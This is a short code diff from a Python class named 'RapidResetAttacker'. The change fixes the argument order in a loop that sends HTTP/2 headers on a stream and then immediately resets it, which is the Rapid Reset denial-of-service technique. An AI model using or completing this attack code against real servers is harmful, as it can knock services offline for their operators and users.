@@ -65,7 +65,7 @@ class RapidResetAttacker:
                             (':authority', self.host),
                             (':scheme', 'https'),
                         ]
-                        conn.send_headers(headers, stream_id, end_stream=False)
+                        conn.send_headers(stream_id, headers, end_stream=False)
                         self.stats.sent += 1
 
                         conn.reset_stream(stream_id)
